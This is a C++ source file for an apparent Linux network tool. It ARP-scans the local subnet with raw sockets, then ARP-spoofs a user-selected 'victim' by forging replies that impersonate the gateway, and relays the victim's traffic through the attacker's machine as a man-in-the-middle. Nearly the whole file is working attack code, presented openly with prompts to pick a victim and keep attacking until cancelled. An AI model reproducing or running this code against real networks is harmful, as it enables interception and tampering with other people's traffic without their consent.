#include "myarpt.hpp"
#include <fcntl.h>

void ARPRequest(IMMAP *mapp){
  EtherPack request;
  countMutex c;
  for (byte i = 0 ; i < 16 ; i ++) {
    std::thread t(ARPBroadcastMultiThread, request, mapp, byte(i * 16), byte(i * 16 + 15), &c);
    t.detach();
  }
  while (true) {
    if (c.count == 16) {
      c.count = 0;
      return;
    } else {
      std::this_thread::sleep_for(std::chrono::seconds(1));
    }
  }
}
IMMAP *ARPRequest(){
  auto mapp = new IMMAP[256];
  ARPRequest(mapp);
  return mapp;
}
void IMMAPprint(IMMAP *mapp){
  int count = 0;
  for (int i = 0 ; i <= 255 ; i ++) {
    if (mapp[i].IPAddress[3] == i) {
      count ++;
      printf("IP:%d.%d.%d.%d\n", mapp[i].IPAddress[0], mapp[i].IPAddress[1], mapp[i].IPAddress[2],
             mapp[i].IPAddress[3]);
      printf("MAC:%02x:%02x:%02x:%02x:%02x:%02x\n", mapp[i].MACAddress[0], mapp[i].MACAddress[1], mapp[i].MACAddress[2],
             mapp[i].MACAddress[3], mapp[i].MACAddress[4], mapp[i].MACAddress[5]);
      
      putchar('\n');
    }
  }
  printf("Print IP-MAC Map Successfully.Found %d Machine.\n", count);
}
void ARPBroadcastMultiThread(EtherPack arpPack, IMMAP *mapp, byte beginIndex, byte endIndex, countMutex *count){
  byte end = endIndex;
  int fd = socket(PF_PACKET, SOCK_RAW, htons(0xffff));
  fcntl(fd, F_SETFL, O_NONBLOCK);
  if (fd <= 0) {
    perror("Error");
    return;
  }
  sockaddr_ll sal;
  bzero(&sal, sizeof(sal));
  sal.sll_family = PF_PACKET;
  sal.sll_ifindex = 3;
  for (int i = beginIndex ; i <= end ; i ++) {
    arpPack.arp.distIP[3] = byte(i);
    long res = sendto(fd, &arpPack, sizeof(arpPack), 0, (struct sockaddr *) &sal, sizeof(sal));
    if (res <= 0) {
      perror("Error");
      continue;
    }
    EtherPack recvpack;
    memset(&recvpack, 0, sizeof(recvpack));
    sockaddr_ll sar;
    memset(&sar, 0, sizeof(sar));
    unsigned salen;
    int recvfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    fcntl(recvfd, F_SETFL, O_NONBLOCK);
    std::this_thread::sleep_for(std::chrono::milliseconds(800));
    res = recvfrom(recvfd, &recvpack, sizeof(recvpack), 0, (struct sockaddr *) &sar, &salen);
    if (res > 0) {
      memcpy(mapp[i].IPAddress, recvpack.arp.hostIP, 4);
      memcpy(mapp[i].MACAddress, recvpack.arp.hostMAC, 6);
    }
    close(recvfd);
  }
  close(fd);
  while (true) {
    if (! count->mutex) {
      count->mutex = true;
      count->count ++;
      count->mutex = false;
      return;
    } else {
      std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
  }
}
void ARPAttack(int victim, IMMAP *mapp){
  if (mapp[victim].IPAddress[0] != 0) {
    EtherPack request;
    memcpy(request.destMAC, mapp[victim].MACAddress, 6);
    request.arp.opreate[1] = 0x02;
    memcpy(request.arp.hostIP, hostInfo::gateway, 4);
    memcpy(request.arp.distMAC, mapp[victim].MACAddress, 6);
    memcpy(request.arp.distIP, mapp[victim].IPAddress, 4);
    int fd = socket(PF_PACKET, SOCK_RAW, htons(0xffff));
    fcntl(fd, F_SETFL, O_NONBLOCK);
    int flags = fcntl(0, F_GETFL);
    flags |= O_NONBLOCK;
    fcntl(0, F_SETFL, flags);
    if (fd <= 0) {
      perror("Error");
      return;
    }
    sockaddr_ll sal;
    bzero(&sal, sizeof(sal));
    sal.sll_family = PF_PACKET;
    sal.sll_ifindex = 3;
    for (int i = 0 ; i <= 65535 ; i ++) {
      sendto(fd, &request, sizeof(request), 0, (struct sockaddr *) &sal, sizeof(sal));
      usleep(1500000);
      request.arp.hostIP[3] = mapp[victim].IPAddress[3];
      memcpy(request.arp.distMAC, mapp[1].MACAddress, 6);
      memcpy(request.destMAC, mapp[1].MACAddress, 6);
      request.arp.distIP[3] = 0x01;
      sendto(fd, &request, sizeof(request), 0, (struct sockaddr *) &sal, sizeof(sal));
      request.arp.hostIP[3] = hostInfo::gateway[3];
      memcpy(request.destMAC, mapp[victim].MACAddress, 6);
      memcpy(request.arp.distMAC, mapp[victim].MACAddress, 6);
      request.arp.distIP[3] = mapp[victim].IPAddress[3];
      fflush(stdout);
      if (getchar() > 0) {
        flags &= ~ O_NONBLOCK;
        fcntl(0, F_SETFL, flags);
        break;
      }
    }
  } else {
    printf("No Victim.\n");
  }
  
}
void dataTransmit(int target, IMMAP *mapp){
  if (mapp[target].IPAddress[0] == 0x00) {
    printf("No victim.\n");
    return;
  }
  int recvfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
  int fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
  sockaddr_ll rsal;
  sockaddr_ll ssal;
  unsigned rsalen;
  bzero(&rsal, sizeof(rsal));
  bzero(&ssal, sizeof(ssal));
  ssal.sll_ifindex = 3;
  ssal.sll_family = PF_PACKET;
  byte buffer[4096];
  for (int i = 0 ; i < 65536 * 256 ;) {
    long res = recvfrom(recvfd, buffer, 4096, 0, (struct sockaddr *) &rsal, &rsalen);
    if (res > 0) {
      //printf("Captured: %d packet(s)\r", ++ i);
      ++ i;
      fflush(stdout);
      if (bytencmp(buffer + 0x1a, mapp[target].IPAddress, 4) == 0/*Receive Data From Victim*/) {
        {
          
          memcpy(buffer, mapp[1].MACAddress, 6);//Replace DestMAC To Gateway
          memcpy(buffer + 6, hostInfo::hostMAC, 6);//Replace SrcMAC To Host(Fake Victim)
          sendto(fd, buffer, res, 0, (struct sockaddr *) &ssal, sizeof(ssal));
        }
      } else if (bytencmp(buffer + 0x1e, mapp[target].IPAddress, 4) ==
                 0/*Receive Data From Gateway, And Destination Is Victim*/) {
        buffer[0x06] = 0xc0;
        memcpy(buffer, mapp[target].MACAddress, 6);//Replace DestMAC To Victim.
        memcpy(buffer + 6, hostInfo::hostMAC, 6);//Replace SrcMAC To Host(Fake Gateway)
        sendto(fd, buffer, res, 0, (struct sockaddr *) &ssal, sizeof(ssal));
      }
    }
  }
}
void dataTransmitPrepare(int target, IMMAP *mapp){
  std::thread t(ARPAttack, target, mapp);
  t.detach();
  for (int i = 0 ; i < 7 ; i ++) {
    std::thread t1(dataTransmit, target, mapp);
    t1.detach();
  }
  dataTransmit(target, mapp);
}
void selectDataTransmitTarget(IMMAP *mapp){
  printf("Warning: If you use this tool, victim will be attacked the whole time UNLESS you cancel this program.\n"
           "Select a victim:");
  int victim;
  scanf("%d", &victim);
  getchar();
  dataTransmitPrepare(victim, mapp);
}
int bytencmp(const byte *b1, const byte *b2, int n){
  for (int i = 0 ; i < n ; i ++) {
    if (b1[i] == b2[i]) {
      continue;
    } else {
      return b1[i] - b2[i];
    }
  }
  return 0;
}
void printHex(byte *str, int size){
  while (size -- > 0) {
    printf("%02x ", *str ++);
  }
}

